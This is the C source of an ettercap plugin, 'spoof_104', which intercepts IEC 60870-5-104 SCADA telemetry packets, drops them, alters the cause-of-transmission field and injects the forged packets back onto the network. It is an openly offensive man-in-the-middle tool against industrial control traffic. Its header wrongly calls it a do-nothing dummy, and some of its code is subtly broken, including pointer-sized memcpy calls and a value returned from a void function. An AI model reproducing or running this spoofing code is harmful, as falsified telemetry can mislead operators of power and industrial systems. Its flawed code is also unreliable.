/*
    dummy -- ettercap plugin -- it does nothig !
                                only demostrates how to write a plugin !

    Copyright (C) ALoR & NaGA
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */

#include <ec_packet.h>
#include <ec_hook.h>
#include <ec_send.h>
#include <ec_session_tcp.h>

#include <stdlib.h>
#include <string.h>

#include <stdio.h>

/* Comment out if you want to use one octet for the Common address of ASDU */
#define ADDR_TWO_OCTECTS 0;

enum {I_FORMAT, S_FORMAT, U_FORMAT};

u_char START        = 0x68;
u_char M_ME_TF_1    = 0x24;
u_char M_SP_TB_1    = 0x1e;

struct apci_header {
  u_char start;
  u_int8 length;
  u_int8 control_1;
  u_int8 control_2;
  u_int8 control_3;
  u_int8 control_4;
};

struct asdu_header {
  u_char type_id;
  // Structure Qualifier
  u_char num_objects : 7;
  u_char sq : 1;
  // Cause of transmission 
  u_char COT: 6;
  u_char PN : 1;
  u_char T : 1;
  #ifdef ADDR_TWO_OCTECTS
    short originator_addr;
  #else 
    u_char originator_addr;
  #endif
  u_int IOA : 16; //8, 16 or 24
  u_char spacer;
  // Specifically for a SIQ information element
  u_char spi : 1;
  u_char blank : 3;
  u_char bl : 1;
  u_char sb : 1;
  u_char nt : 1;
  u_char iv : 1;
};

/* prototypes is required for -Wmissing-prototypes */

/* 
 * this function must be present.
 * it is the entry point of the plugin 
 */
int plugin_load(void *);

/* additional functions */
static int spoof_104_init(void *);
static int spoof_104_fini(void *);

static void parse_tcp(struct packet_object *po);
static int get_type(u_int8 control);
static void print_apci(struct apci_header *apci);
static void print_asdu(struct asdu_header *asdu);


/* plugin operations */

struct plugin_ops spoof_104_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "spoof_104",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "Spoofs IEC 104 Reply Packets",  
   /* the plugin version. */ 
   .version =           "0.0",   
   /* activation function */
   .init =              &spoof_104_init,
   /* deactivation function */                     
   .fini =              &spoof_104_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   DEBUG_MSG("Spoof 104 plugin load function.");
   /*
    *  in this fuction we MUST call the registration procedure that will set
    *  up the plugin according to the plugin_ops structure.
    *  the returned value MUST be the same as plugin_register()
    *  the opaque pointer params MUST be passed to plugin_register()
    */
   return plugin_register(handle, &spoof_104_ops);
}

/*********************************************************/

static int spoof_104_init(void *dummy) 
{
   /* the control is given to this function
    * and ettercap is suspended until its return.
    * 
    * you can create a thread and return immediately
    * and then kill it in the fini function.
    *
    * you can also set an hook point with
    * hook_add(), in this case you have to set the
    * plugin type to PL_HOOK.
    */
   
   USER_MSG("Spoof 104: Plugin running...\n");

   hook_add(HOOK_PACKET_TCP, &parse_tcp);

   /* return PLUGIN_FINISHED if the plugin has terminated
    * its execution.
    * return PLUGIN_RUNNING if it has spawned a thread or it
    * is hooked to an ettercap hookpoint and
    * it needs to be deactivated with the fini method.
    */
   return PLUGIN_RUNNING;
}


static int spoof_104_fini(void *dummy) 
{
   /* 
    * called to terminate a plugin.
    * usually to kill threads created in the 
    * init function or to remove hook added 
    * previously.
    */
   USER_MSG("Spoof 104: Plugin finalization.\n");

   hook_del(HOOK_PACKET_TCP, &parse_tcp); 

   return PLUGIN_FINISHED;
}

static void parse_tcp(struct packet_object *po)
{
  struct apci_header *apci;
  struct asdu_header *asdu;
  apci = (struct apci_header *)po->DATA.data;
  asdu = (struct asdu_header *)(apci + 1);

  /* We are interested in monitor packets of type M_SP_TB_1 */
  if(START == apci->start && I_FORMAT == get_type(apci->control_1) && M_SP_TB_1 == asdu->type_id) {

    USER_MSG("=========================");
    USER_MSG("\nOld Packet\n");
    print_apci(apci);
    print_asdu(asdu);
    USER_MSG("=========================");

    /* we can't inject in unoffensive mode or in bridge mode */
    if (GBL_OPTIONS->unoffensive || GBL_OPTIONS->read || GBL_OPTIONS->iface_bridge) {
    // if ( GBL_OPTIONS->unoffensive) {
      USER_MSG("\n[!!] We can't inject in unoffensive mode or in bridge mode.\n");
      return -EINVALID;
    } 

    /* Prevent the packet being sent */
    po->flags ^= PO_DROPPED;

    /* Modify the value */
    asdu->COT = 0x2A;
    // asdu->spi = 0;
    memcpy(po->DATA.data, apci, sizeof(apci));
    memcpy(po->DATA.data + sizeof(struct apci_header), asdu, sizeof(asdu));

    /* DEBUG */
    USER_MSG("=========================");
    USER_MSG("\nNew Packet\n");
    print_apci(apci);
    print_asdu(asdu);
    USER_MSG("=========================");

    /* Send modified packet */
    send_tcp(&po->L3.src, &po->L3.dst, po->L4.src, po->L4.dst, po->L4.seq, po->L4.ack, TH_ACK, po->DATA.data,po->DATA.disp_len );
    
  }
}

/* Read the first two bits from from the control octet 1
   Return the result based on the values */
static int get_type(u_int8 control)
{
    int one = ((control & 1<<0)==0 ? false : true); 
    int two = ((control & 1<<1)==0 ? false : true);

    if(one == 0)
      return I_FORMAT;
    if(one == 1 & two == 0)
      return S_FORMAT;
    if(one == 1 & two == 1)
      return U_FORMAT;
    return -1;
}

/* Debug print messages */
static void print_apci(struct apci_header *apci)
{
  USER_MSG("\n[-] APCI\n[+] START: \t%x \n[+] Length: \t%d \n[+] Control 1: \t%x \n[+] Control 2: \t%x \n[+] Control 3: \t%x \n[+] Control 4: \t%x \n[+] Type: \t%d\n", 
      apci->start, apci->length, apci->control_1, apci->control_2, apci->control_3, apci->control_4, get_type(apci->control_1));
}

static void print_asdu(struct asdu_header *asdu)
{
  USER_MSG("\n[-] ASDU\n[+] TC:\t\t 0x%x <%d> \n[+] SQ:\t\t %x \n[+] COT:\t %d \n[+] PN:\t\t %x \n[+] T:\t\t %x \n[+] O-Addr:\t %d \n[+] IOA:\t %d \n", 
    asdu->type_id, asdu->type_id, asdu->sq, asdu->COT, asdu->PN, asdu->T, asdu->originator_addr, asdu->IOA);
  USER_MSG("\n[*] SPI: %d - BL: %d - SB: %d - NT: %d - IV: %d\n",
    asdu->spi, asdu->bl, asdu->sb, asdu->nt, asdu->iv);
}

/* EOF */

// vim:ts=3:expandtab

